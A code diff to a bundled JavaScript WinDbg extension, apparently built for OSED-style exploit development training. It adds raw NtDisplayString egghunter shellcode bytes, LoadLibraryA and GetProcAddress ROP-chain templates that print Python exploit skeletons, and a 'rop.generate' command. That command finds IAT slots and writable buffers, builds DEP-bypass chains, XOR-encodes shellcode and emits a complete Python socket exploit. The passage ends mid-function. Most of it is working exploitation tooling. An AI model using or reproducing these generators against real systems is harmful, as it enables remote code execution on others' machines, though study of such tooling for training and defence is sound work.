@@ -2281,6 +2281,114 @@ var osed_bundle = (() => {
     231
     // jmp edi
   ];
+  var NTDISPLAY_X86 = [
+    102,
+    129,
+    202,
+    255,
+    15,
+    // or dx, 0x0fff
+    66,
+    // inc edx
+    82,
+    // push edx
+    106,
+    67,
+    // push 0x43  (NtDisplayString syscall)
+    88,
+    // pop eax
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    90,
+    // pop edx
+    116,
+    239,
+    // je short (back to or dx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    250,
+    // mov edi, edx
+    175,
+    // scasd
+    117,
+    234,
+    // jne short (back to inc edx)
+    175,
+    // scasd
+    117,
+    231,
+    // jne short (back to inc edx)
+    255,
+    231
+    // jmp edi
+  ];
+  var NTDISPLAY_WOW64 = [
+    102,
+    129,
+    201,
+    255,
+    15,
+    // or cx, 0x0fff
+    65,
+    // inc ecx
+    81,
+    // push ecx
+    106,
+    67,
+    // push 0x43  (NtDisplayString syscall)
+    88,
+    // pop eax
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    89,
+    // pop ecx
+    116,
+    239,
+    // je short (back to or cx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    249,
+    // mov edi, ecx
+    175,
+    // scasd
+    117,
+    234,
+    // jne short (back to inc ecx)
+    175,
+    // scasd
+    117,
+    231,
+    // jne short (back to inc ecx)
+    255,
+    231
+    // jmp edi
+  ];
+  var TAG_OFFSET_NTDISPLAY = 18;
+  var TAG_OFFSET_NTDISPLAY_WOW64 = 18;
+  var SYSCALL_OFFSET_NTDISPLAY = 8;
+  var SYSCALL_OFFSET_NTDISPLAY_WOW64 = 8;
+  var NTDISPLAY_SYSCALL = {
+    win7: 67,
+    win10: 67
+  };
   var SEH_EGGHUNTER = [
     // jmp short install_seh
     235,
@@ -2419,10 +2527,24 @@ var osed_bundle = (() => {
     let tagOffset;
     let syscallOffset = null;
     let label;
+    let syscallSize = 4;
     if (options.mode === "seh") {
       template = [...SEH_EGGHUNTER];
       tagOffset = TAG_OFFSET_SEH;
       label = "seh egghunter";
+    } else if (options.mode === "ntdisplay") {
+      if (options.wow64) {
+        template = [...NTDISPLAY_WOW64];
+        tagOffset = TAG_OFFSET_NTDISPLAY_WOW64;
+        syscallOffset = SYSCALL_OFFSET_NTDISPLAY_WOW64;
+        label = "ntdisplay wow64 egghunter";
+      } else {
+        template = [...NTDISPLAY_X86];
+        tagOffset = TAG_OFFSET_NTDISPLAY;
+        syscallOffset = SYSCALL_OFFSET_NTDISPLAY;
+        label = "ntdisplay egghunter";
+      }
+      syscallSize = 1;
     } else if (options.wow64) {
       template = [...NTACCESS_WOW64];
       tagOffset = TAG_OFFSET_NTACCESS_WOW64;
@@ -2437,8 +2559,15 @@ var osed_bundle = (() => {
     template.splice(tagOffset, 4, ...tag);
     let syscallUsed = null;
     if (syscallOffset !== null) {
-      const sysnum = (_a = options.syscall) != null ? _a : SYSCALL_TABLE[options.os];
-      template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+      const defaultSyscall = options.mode === "ntdisplay" ? NTDISPLAY_SYSCALL[options.os] : SYSCALL_TABLE[options.os];
+      const sysnum = (_a = options.syscall) != null ? _a : defaultSyscall;
+      if (syscallSize === 1) {
+        if (sysnum < 1 || sysnum > 127) {
+        }
+        template.splice(syscallOffset, 1, sysnum & 255);
+      } else {
+        template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+      }
       syscallUsed = sysnum;
     }
     const badcharHits3 = checkBadchars(template, label, badSet);
@@ -2458,6 +2587,8 @@ var osed_bundle = (() => {
       examples: [
         'dx @$osed().egghunter("W00T")',
         'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win7")',
+        'dx @$osed().egghunter("W00T", "ntdisplay")',
+        'dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D")',
         'dx @$osed().egghunter("B33F", "seh")',
         'dx @$osed().egghunter("W00T", "ntaccess", true)',
         'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")',
@@ -2465,7 +2596,7 @@ var osed_bundle = (() => {
       ],
       schema: {
         tag: { type: "string", default: "W00T" },
-        mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
+        mode: { type: "string", enum: ["ntaccess", "ntdisplay", "seh"], default: "ntaccess" },
         wow64: { type: "boolean", default: false },
         badchars: { type: "array", default: [] },
         os: { type: "string", enum: ["win7", "win10"], default: "win10" },
@@ -5311,7 +5442,9 @@ var osed_bundle = (() => {
     WriteProcessMemory: 5,
     VirtualProtectEx: 5,
     VirtualAllocEx: 5,
-    WinExec: 2
+    WinExec: 2,
+    LoadLibraryA: 1,
+    GetProcAddress: 2
   };
   var STRATEGY_NAMES = /* @__PURE__ */ new Map([
     ["virtualprotect", "VirtualProtect"],
@@ -5320,6 +5453,9 @@ var osed_bundle = (() => {
     ["virtualprotectex", "VirtualProtectEx"],
     ["virtualallocex", "VirtualAllocEx"],
     ["winexec", "WinExec"],
+    ["loadlibrarya", "LoadLibraryA"],
+    ["loadlibrary", "LoadLibraryA"],
+    ["getprocaddress", "GetProcAddress"],
     ["stackpivot", "Stack Pivot"],
     ["stack pivot", "Stack Pivot"]
   ]);
@@ -5876,6 +6012,19 @@ var osed_bundle = (() => {
           { role: "arg1-lpCmdLine", placeholder: "LP_CMDLINE", comment: "lpCmdLine (pointer to command string)" },
           { role: "arg2-uCmdShow", value: 1, comment: "uCmdShow = SW_SHOWNORMAL" }
         ];
+      case "LoadLibraryA":
+        return [
+          { role: "api-address", placeholder: "LOADLIBRARYA", comment: "LoadLibraryA" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. next stage or GetProcAddress chain)" },
+          { role: "arg1-lpLibFileName", placeholder: "LP_LIBFILENAME", comment: "lpLibFileName (pointer to DLL name string)" }
+        ];
+      case "GetProcAddress":
+        return [
+          { role: "api-address", placeholder: "GETPROCADDRESS", comment: "GetProcAddress" },
+          { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. resolved function or next stage)" },
+          { role: "arg1-hModule", placeholder: "HMODULE", comment: "hModule (from LoadLibraryA return value)" },
+          { role: "arg2-lpProcName", placeholder: "LP_PROCNAME", comment: "lpProcName (pointer to function name string)" }
+        ];
       case "Stack Pivot":
         return [
           { role: "pivot-target", placeholder: "PIVOT_TARGET", comment: "pivot target address" }
@@ -6157,6 +6306,64 @@ var osed_bundle = (() => {
       rows.push({ Diagnostic: "VIOLATION", Detail: v.message });
     }
     return rows;
+  }
+
+  // src/rop/exploit_frame.ts
+  function buildExploitFrame(strategy, retAddrWord, writableWord) {
+    const junk = { value: 2425393296, comment: "junk" };
+    switch (strategy) {
+      case "VirtualProtect":
+        return [
+          retAddrWord,
+          { placeholder: "SHELLCODE", comment: "lpAddress (shellcode start on stack)" },
+          { value: 513, comment: "dwSize" },
+          { value: 64, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+          writableWord
+        ];
+      case "VirtualAlloc":
+        return [
+          retAddrWord,
+          { placeholder: "SHELLCODE", comment: "lpAddress (NULL = OS chooses, or BUF+N)" },
+          { value: 4096, comment: "dwSize = 0x1000" },
+          { value: 4096, comment: "flAllocationType = MEM_COMMIT" },
+          { value: 64, comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+        ];
+      case "WriteProcessMemory":
+        return [
+          retAddrWord,
+          { value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { placeholder: "DEST", comment: "lpBaseAddress (executable destination)" },
+          { placeholder: "SHELLCODE", comment: "lpBuffer (shellcode on stack)" },
+          { placeholder: "SHELLCODE_LEN", comment: "nSize (shellcode byte count)" },
+          writableWord
+        ];
+      case "VirtualProtectEx":
+        return [
+          retAddrWord,
+          { value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { placeholder: "SHELLCODE", comment: "lpAddress" },
+          { value: 513, comment: "dwSize" },
+          { value: 64, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+          writableWord
+        ];
+      case "VirtualAllocEx":
+        return [
+          retAddrWord,
+          { value: 4294967295, comment: "hProcess = GetCurrentProcess()" },
+          { placeholder: "SHELLCODE", comment: "lpAddress" },
+          { value: 4096, comment: "dwSize" },
+          { value: 4096, comment: "flAllocationType = MEM_COMMIT" },
+          { value: 64, comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+        ];
+      case "WinExec":
+        return [
+          retAddrWord,
+          { placeholder: "CMD_STRING", comment: "lpCmdLine pointer" },
+          { value: 1, comment: "uCmdShow = SW_SHOWNORMAL" }
+        ];
+      default:
+        return [retAddrWord, junk];
+    }
   }
 
   // src/semantics/types.ts
@@ -8061,6 +8268,16 @@ var osed_bundle = (() => {
       ]
     },
     {
+      name: "rop.generate",
+      description: "One-command exploit generator. Discovers the IAT slot and writable buffer, builds a slot_call ROP chain for the chosen DEP-bypass API, XOR-encodes shellcode, and emits a complete Python exploit. All discovery is optional \u2014 pass iatSlot, buf, retAddr manually to override. Requires a loaded corpus (rop.scan / rop.scan_live).",
+      usage: "dx @$osed().rop.generate({api, shellcode?, badchars?, module?, offset?, iatSlot?, buf?, retAddr?, writable?, entrySkew?})",
+      examples: [
+        'dx @$osed().rop.generate({api: "VirtualAlloc", shellcode: "FC E8 82 00 00 00 60", badchars: "00 0A 0D", module: "MSA2Mfilter03", offset: 780})',
+        'dx @$osed().rop.generate({api: "VirtualProtect", iatSlot: 0x1005D060, buf: "0x00420000", badchars: "00 0A 0D"})',
+        'dx @$osed().rop.generate({api: "VirtualAlloc"})'
+      ]
+    },
+    {
       name: "rop.export",
       description: "Exports emitted gadgets (and optionally the synthesized stack layout) as a Python exploit stub. If a file path is given, writes to disk; otherwise prints to console.",
       usage: "dx @$osed().rop.export(planId, path?)",
@@ -9499,27 +9716,170 @@ var osed_bundle = (() => {
     print('shellcode = b"\\x90" * 16 + b"\\xfc\\xe8..."');
     print('payload   = b"A" * OFFSET + rop_chain + shellcode');
   }
+  function llaTemplate(mod) {
+    section("LoadLibraryA \u2014 ROP Chain Skeleton");
+    print("Prototype: HMODULE LoadLibraryA(LPCSTR lpLibFileName)");
+    print("Goal:      load a DLL at runtime to resolve APIs not in the target's IAT.");
+    print("Returns:   HMODULE in EAX (pass to GetProcAddress).");
+    section("Step 1 \u2014 find addresses");
+    print(`  LoadLibraryA addr:     dx @$osed().sc.iat_find("LoadLibraryA")`);
+    print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
+    section("Step 2 \u2014 PUSHAD technique register map");
+    print("  After PUSHAD ; RET, the stack looks like:");
+    print("    [ESP+0]  = EDI  <- consumed by RET (set to LoadLibraryA address)");
+    print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. GetProcAddress)");
+    print("    [ESP+8]  = EBP  <- lpLibFileName (pointer to DLL name string)");
+    print("    [ESP+12] = saved_ESP <- (unused by LoadLibraryA)");
+    print("    [ESP+16] = EBX  <- (unused)");
+    print("    [ESP+20] = EDX  <- (unused)");
+    print("    [ESP+24] = ECX  <- (unused)");
+    print("    [ESP+28] = EAX  <- (unused)");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v)");
+    print("");
+    print("OFFSET       = ???           # bytes from buffer start to EIP control");
+    print('LLA          = 0x????????    # LoadLibraryA  dx @$osed().sc.iat_find("LoadLibraryA")');
+    print("NEXT_STAGE   = 0x????????    # return addr (e.g. GetProcAddress chain entry)");
+    print('DLL_NAME_PTR = 0x????????    # pointer to null-terminated DLL name (e.g. "ws2_32.dll")');
+    print("");
+    print('rop_chain = b""');
+    print("");
+    print("# \u2500\u2500 Register setup (PUSHAD technique) \u2500\u2500");
+    print("rop_chain += p32(0x????????)  # pop edi ; ret");
+    print("rop_chain += p32(LLA)         # EDI = LoadLibraryA address");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop esi ; ret");
+    print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr (next stage)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
+    print("rop_chain += p32(DLL_NAME_PTR)# EBP = lpLibFileName");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebx ; ret  (EBX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("");
+    print("# LoadLibraryA returns HMODULE in EAX \u2014 chain NEXT_STAGE to");
+    print("# a GetProcAddress chain that consumes EAX as hModule.");
+    section("Step 4 \u2014 staging the DLL name string");
+    print('  The DLL name (e.g. "ws2_32.dll\\x00") must be null-terminated and');
+    print("  accessible at DLL_NAME_PTR when LoadLibraryA runs. Options:");
+    print("  1. Place it on the stack after the chain and compute its ESP-relative address.");
+    print("  2. Write it into a writable .data section via WriteProcessMemory or mov [reg],val gadgets.");
+    print("  3. Find it already in memory (e.g. a string table in the target binary).");
+  }
+  function gpaTemplate(mod) {
+    section("GetProcAddress \u2014 ROP Chain Skeleton");
+    print("Prototype: FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName)");
+    print("Goal:      resolve a function address from a loaded DLL at runtime.");
+    print("Returns:   FARPROC (function pointer) in EAX.");
+    section("Step 1 \u2014 find addresses");
+    print(`  GetProcAddress addr:   dx @$osed().sc.iat_find("GetProcAddress")`);
+    print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
+    section("Step 2 \u2014 PUSHAD technique register map");
+    print("  After PUSHAD ; RET, the stack looks like:");
+    print("    [ESP+0]  = EDI  <- consumed by RET (set to GetProcAddress address)");
+    print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. call eax)");
+    print("    [ESP+8]  = EBP  <- hModule (from LoadLibraryA return value in EAX)");
+    print("    [ESP+12] = saved_ESP <- lpProcName (not directly settable)");
+    print("    [ESP+16] = EBX  <- (lpProcName alternative \u2014 see constraints)");
+    print("    [ESP+20] = EDX  <- (unused)");
+    print("    [ESP+24] = ECX  <- (unused)");
+    print("    [ESP+28] = EAX  <- (unused)");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v)");
+    print("");
+    print("OFFSET        = ???           # bytes from buffer start to EIP control");
+    print('GPA           = 0x????????    # GetProcAddress  dx @$osed().sc.iat_find("GetProcAddress")');
+    print("NEXT_STAGE    = 0x????????    # return addr (e.g. jmp eax / call eax to run resolved func)");
+    print("HMODULE       = 0x????????    # hModule from LoadLibraryA (or known module base)");
+    print("FUNC_NAME_PTR = 0x????????    # pointer to null-terminated function name string");
+    print("");
+    print('rop_chain = b""');
+    print("");
+    print("# \u2500\u2500 Register setup (PUSHAD technique) \u2500\u2500");
+    print("rop_chain += p32(0x????????)  # pop edi ; ret");
+    print("rop_chain += p32(GPA)         # EDI = GetProcAddress address");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop esi ; ret");
+    print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
+    print("rop_chain += p32(HMODULE)     # EBP = hModule");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebx ; ret");
+    print("rop_chain += p32(FUNC_NAME_PTR)# EBX = lpProcName");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("");
+    print("# GetProcAddress returns FARPROC in EAX \u2014 dispatch via jmp eax or call eax.");
+    section("Constraints");
+    print("  PUSHAD places saved ESP as the 2nd argument (lpProcName). Since saved ESP");
+    print("  is not directly settable, the PUSHAD technique only works if:");
+    print("  1. You use a flat stdcall frame (no PUSHAD) and place hModule/lpProcName directly.");
+    print("  2. Or you stage lpProcName at a known address and accept saved ESP as junk,");
+    print("     rearranging the register map to put lpProcName in EBX (requires a different");
+    print("     dispatch shape or a RET-slide variant).");
+    print("  3. Or chain from LoadLibraryA where EAX already holds hModule and use gadgets");
+    print("     to marshal arguments directly.");
+    print("");
+    print("  For chained LoadLibraryA -> GetProcAddress resolution, a flat stdcall frame");
+    print("  or IAT slot_call dispatch is usually simpler than PUSHAD.");
+  }
   function createRopTemplateCommand() {
     return {
       name: "rop_template",
-      description: "Print a commented VirtualProtect or WriteProcessMemory ROP chain skeleton.",
+      description: "Print a commented ROP chain skeleton for a supported API.",
       usage: "dx @$osed().rop_template(api?, module?)",
       examples: [
         'dx @$osed().rop_template("VirtualProtect", "essfunc")',
-        'dx @$osed().rop_template("WriteProcessMemory", "essfunc")'
+        'dx @$osed().rop_template("WriteProcessMemory", "essfunc")',
+        'dx @$osed().rop_template("LoadLibraryA", "essfunc")',
+        'dx @$osed().rop_template("GetProcAddress", "essfunc")'
       ],
       schema: {
-        api: { type: "string", enum: ["VirtualProtect", "WriteProcessMemory"], default: "VirtualProtect" },
+        api: { type: "string", enum: ["VirtualProtect", "WriteProcessMemory", "LoadLibraryA", "GetProcAddress"], default: "VirtualProtect" },
         module: { type: "string", default: "TARGET_MODULE" }
       },
       execute(options) {
         var _a, _b;
         const api = (_a = options.api) != null ? _a : "VirtualProtect";
         const mod = (_b = options.module) != null ? _b : "TARGET_MODULE";
-        if (api === "WriteProcessMemory") {
-          wpmTemplate(mod);
-        } else {
-          vpTemplate(mod);
+        switch (api) {
+          case "WriteProcessMemory":
+            wpmTemplate(mod);
+            break;
+          case "LoadLibraryA":
+            llaTemplate(mod);
+            break;
+          case "GetProcAddress":
+            gpaTemplate(mod);
+            break;
+          default:
+            vpTemplate(mod);
+            break;
         }
         return {
           command: "rop_template",
@@ -12183,10 +12543,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-09-17T02:18:09.532Z" : globalThis[key2];
+        value = true ? "2026-10-19T22:10:58.017Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "0dcd911c444f" : globalThis[key2];
+        value = true ? "2cb74191e8a7" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -14926,6 +15286,298 @@ var osed_bundle = (() => {
       });
       return toDxResult("ROP Slot Call", rows);
     };
+    const API_IAT_NAMES = {
+      VirtualProtect: "VirtualProtect",
+      VirtualAlloc: "VirtualAlloc",
+      WriteProcessMemory: "WriteProcessMemory",
+      VirtualProtectEx: "VirtualProtectEx",
+      VirtualAllocEx: "VirtualAllocEx",
+      WinExec: "WinExec"
+    };
+    const executeRopGenerate = (...args) => {
+      var _a, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.generate");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("Exploit Builder", rows2);
+        return toDxResult("Exploit Builder", rows2);
+      }
+      const exploitStale = staleCorpusGuard("Exploit Builder", "rop.generate");
+      if (exploitStale) return exploitStale;
+      const options = isPlainObject(args[0]) ? args[0] : { api: args[0], shellcode: args[1], badchars: args[2] };
+      const strategyName = normalizeExploitStrategy(String((_a = options.api) != null ? _a : "VirtualAlloc"));
+      if (!strategyName || strategyName === "Stack Pivot" || strategyName === "LoadLibraryA" || strategyName === "GetProcAddress") {
+        const rows2 = [{
+          Error: "rop.generate supports VirtualProtect, VirtualAlloc, WriteProcessMemory, WinExec, and Ex variants. Got: " + String((_b = options.api) != null ? _b : "(none)")
+        }];
+        renderRows("Exploit Builder", rows2);
+        return toDxResult("Exploit Builder", rows2);
+      }
+      const shellcodeHex = String((_c = options.shellcode) != null ? _c : "");
+      const badchars = parseBadcharsOption(options.badchars);
+      const entrySkew = Number((_d = options.entrySkew) != null ? _d : 0);
+      const pythonLines = [];
+      const allWarnings = [];
+      const allErrors = [];
+      section(`Exploit Builder \u2014 ${strategyName}`);
+      let iatSlotAddr;
+      if (options.iatSlot !== void 0) {
+        iatSlotAddr = Number(options.iatSlot) >>> 0;
+        info(`IAT slot: ${hex32(iatSlotAddr)} (user-supplied)`);
+      } else {
+        const iatName = API_IAT_NAMES[strategyName];
+        if (iatName) {
+          try {
+            const scNs = api.sc;
+            if (scNs && typeof scNs.iat_find === "function") {
+              const iatResult = scNs.iat_find(iatName);
+              if (lastResult && lastResult.success && lastResult.findings.length > 0) {
+                const firstRow = lastResult.findings[0];
+                const slotStr = String((_f = (_e = firstRow.Slot) != null ? _e : firstRow.slot) != null ? _f : "");
+                const match = /0x([0-9a-fA-F]+)/.exec(slotStr);
+                if (match) {
+                  iatSlotAddr = parseInt(match[1], 16) >>> 0;
+                  info(`IAT slot: ${hex32(iatSlotAddr)} (auto-discovered for ${iatName})`);
+                }
+              }
+            }
+          } catch (e) {
+          }
+        }
+        if (iatSlotAddr === void 0) {
+          allWarnings.push(`Could not auto-discover IAT slot for ${strategyName}. Pass iatSlot manually, or run: dx @$osed().sc.iat_find("${strategyName}")`);
+          warn(`IAT slot not found \u2014 use iatSlot parameter or run sc.iat_find("${strategyName}")`);
+        }
+      }
+      let bufAddr;
+      if (options.buf !== void 0) {
+        bufAddr = String(options.buf).trim();
+        info(`Buffer: ${bufAddr} (user-supplied)`);
+      } else {
+        try {
+          const cavesResult = registry.execute("code_caves", {
+            module: options.module,
+            minSize: 512,
+            maxResults: 5
+          });
+          if (cavesResult.success && cavesResult.findings.length > 0) {
+            const cave = cavesResult.findings[0];
+            const caveAddr = String((_g = cave.address) != null ? _g : "");
+            const addrMatch = /0x([0-9a-fA-F]+)/i.exec(caveAddr);
+            if (addrMatch) {
+              bufAddr = `0x${addrMatch[1]}`;
+              const caveSize = (_h = cave.size) != null ? _h : "?";
+              info(`Buffer: ${bufAddr} (code cave, ${caveSize} bytes, module: ${(_i = cave.module) != null ? _i : "?"})`);
+            }
+          }
+        } catch (e) {
+        }
+        if (!bufAddr) {
+          allWarnings.push("Could not auto-discover writable buffer. Pass buf address, or run: dx @$osed().code_caves(module)");
+          warn("Writable buffer not found \u2014 use buf parameter or run code_caves()");
+          bufAddr = "BUF";
+        }
+      }
+      let retGadgetAddr;
+      let retGadgetSeq = "";
+      const jmpEspCandidates = currentRopCorpus.query({
+        capability: "DISPATCH_JMP_REGISTER",
+        executableOnly: true
+      });
+      const jmpEsp = jmpEspCandidates.find((g) => {
+        const cap = g.capabilities.find((c) => c.kind === "DISPATCH_JMP_REGISTER");
+        return cap && cap.register === "esp";
+      });
+      if (jmpEsp) {
+        retGadgetAddr = firstKnownAddress(jmpEsp);
+        retGadgetSeq = jmpEsp.instructions.map((i) => i.normalizedText || i.originalText).join(" ; ");
+      }
+      let retAddrWord;
+      if (options.retAddr !== void 0) {
+        const ra = String(options.retAddr).trim();
+        if (/^(0x)?[0-9a-fA-F]+$/.test(ra)) {
+          retAddrWord = { value: parseInt(ra.replace(/^0x/i, ""), 16) >>> 0, comment: "return address (user-supplied)" };
+        } else {
+          retAddrWord = { placeholder: ra.toUpperCase(), comment: "return address (user-supplied placeholder)" };
+        }
+      } else if (retGadgetAddr !== void 0) {
+        retAddrWord = { value: Number(retGadgetAddr), comment: `return via: ${retGadgetSeq}` };
+        info(`Return gadget: ${hex32(retGadgetAddr)} \u2014 ${retGadgetSeq}`);
+      } else {
+        retAddrWord = { placeholder: "RETADDR", comment: "return address \u2014 find jmp esp or similar" };
+        allWarnings.push("No jmp esp gadget found for post-call return. Supply retAddr or find one with: rop.query({capability: 'DISPATCH_JMP_REGISTER'})");
+        warn("No jmp esp found \u2014 supply retAddr or query the corpus");
+      }
+      let writableWord;
+      if (options.writable !== void 0) {
+        writableWord = { value: Number(options.writable) >>> 0, comment: "writable dword (out-param sink)" };
+      } else {
+        const bufParsed = /^0x([0-9a-fA-F]+)$/i.exec(bufAddr);
+        if (bufParsed) {
+          writableWord = { value: parseInt(bufParsed[1], 16) + 256 >>> 0, comment: "writable dword (BUF+0x100, out-param sink)" };
+        } else {
+          writableWord = { placeholder: "WRITABLE", comment: "any writable dword for out-param" };
+        }
+      }
+      const frame = buildExploitFrame(strategyName, retAddrWord, writableWord);
+      const frameSpec = frame.map((w) => {
+        if (w.derefSlot !== void 0) return `[${hex32(w.derefSlot)}]`;
+        if (w.placeholder) return w.placeholder;
+        return hex32(w.value);
+      }).join(" ");
+      let chainPlan;
+      if (iatSlotAddr !== void 0) {
+        chainPlan = planSlotDispatch(
+          currentRopCorpus,
+          /^0x[0-9a-fA-F]+$/i.test(bufAddr) ? { value: parseInt(bufAddr.replace(/^0x/i, ""), 16) >>> 0 } : { placeholder: bufAddr.toUpperCase() },
+          iatSlotAddr,
+          frame,
+          badchars,
+          buildStableAddressPredicate(),
+          entrySkew
+        );
+        if (chainPlan.success) {
+          info(`Chain: ${chainPlan.steps.length} steps, ${chainPlan.stackBytes} bytes`);
+          if (chainPlan.placeholders.length > 0) {
+            info(`Placeholders to resolve: ${chainPlan.placeholders.join(", ")}`);
+          }
+        } else {
+          for (const u of chainPlan.unsatisfied) {
+            allWarnings.push(u);
+            warn(u);
+          }
+        }
+      }
+      let encodeResult;
+      if (shellcodeHex.trim().length > 0) {
+        try {
+          const encResult = registry.execute("encode", {
+            shellcode: shellcodeHex,
+            exclude: badchars.length > 0 ? badchars : [0, 10, 13]
+          });
+          if (encResult.success && encResult.findings.length > 0) {
+            encodeResult = encResult.findings[0];
+            info(`Shellcode: ${encodeResult.totalSize} bytes (key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes)`);
+          } else {
+            for (const e of encResult.errors) allErrors.push(e);
+            for (const w of encResult.warnings) allWarnings.push(w);
+          }
+        } catch (err) {
+          allWarnings.push(`Shellcode encoding failed: ${err instanceof Error ? err.message : String(err)}`);
+        }
+      }
+      section("Python Exploit");
+      pythonLines.push("#!/usr/bin/env python3");
+      pythonLines.push(`# ${strategyName} DEP bypass exploit \u2014 generated by osed-windbg rop.generate()`);
+      pythonLines.push("import socket");
+      pythonLines.push("from struct import pack");
+      pythonLines.push("");
+      pythonLines.push("# ---- Configuration ----");
+      pythonLines.push(`target_host = "192.168.1.100"  # TODO: set target`);
+      pythonLines.push(`target_port = 9999             # TODO: set port`);
+      pythonLines.push(`total_length = 5000             # TODO: set buffer size`);
+      if (options.offset !== void 0) {
+        pythonLines.push(`offset = ${Number(options.offset)}                  # EIP offset from triage/pattern_offset`);
+      } else {
+        pythonLines.push(`offset = 0                     # TODO: set EIP offset from triage/pattern_offset`);
+      }
+      pythonLines.push("");
+      if (chainPlan == null ? void 0 : chainPlan.success) {
+        pythonLines.push("# ---- ROP Chain ----");
+        pythonLines.push('rop = b""');
+        for (const step of chainPlan.steps) {
+          const word = step.kind === "gadget" ? hex32(step.address) : (_j = step.placeholder) != null ? _j : hex32(step.value);
+          pythonLines.push(`rop += pack("<I", ${word})  # ${step.comment}`);
+        }
+        pythonLines.push("");
+      } else {
+        pythonLines.push("# ---- ROP Chain (could not auto-build \u2014 see warnings) ----");
+        pythonLines.push('rop = b""');
+        pythonLines.push(`# TODO: Build chain manually with rop.slot_call("${bufAddr}", "${iatSlotAddr !== void 0 ? hex32(iatSlotAddr) : "IAT_SLOT"}", "${frameSpec}", "${badchars.map((b) => b.toString(16).padStart(2, "0")).join(" ")}")`);
+        pythonLines.push("");
+      }
+      if (encodeResult) {
+        const combined = encodeResult.combined;
+        const pyBytes = combined.map((b) => `\\x${(b & 255).toString(16).padStart(2, "0")}`).join("");
+        pythonLines.push("# ---- Encoded Shellcode ----");
+        pythonLines.push(`# XOR key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes, payload: ${encodeResult.encodedSize} bytes`);
+        const CHUNK = 60;
+        const fullStr = `b"${pyBytes}"`;
+        if (fullStr.length <= 100) {
+          pythonLines.push(`shellcode = ${fullStr}`);
+        } else {
+          pythonLines.push('shellcode = b""');
+          for (let i = 0; i < combined.length; i += CHUNK) {
+            const chunk = combined.slice(i, i + CHUNK);
+            const chunkStr = chunk.map((b) => `\\x${(b & 255).toString(16).padStart(2, "0")}`).join("");
+            pythonLines.push(`shellcode += b"${chunkStr}"`);
+          }
+        }
+        pythonLines.push("");
+      } else if (shellcodeHex.trim().length > 0) {
+        pythonLines.push("# ---- Shellcode (encoding failed \u2014 see warnings) ----");
+        pythonLines.push(`shellcode = b""  # TODO: encode manually with encode("${shellcodeHex.slice(0, 20)}...", badchars)`);
+        pythonLines.push("");
+      } else {
+        pythonLines.push("# ---- Shellcode ----");
+        pythonLines.push('shellcode = b""  # TODO: paste msfvenom output or use encode()');
+        pythonLines.push("");
+      }
+      pythonLines.push("# ---- NOP sled (optional) ----");
+      pythonLines.push('nops = b"\\x90" * 16');
+      pythonLines.push("");
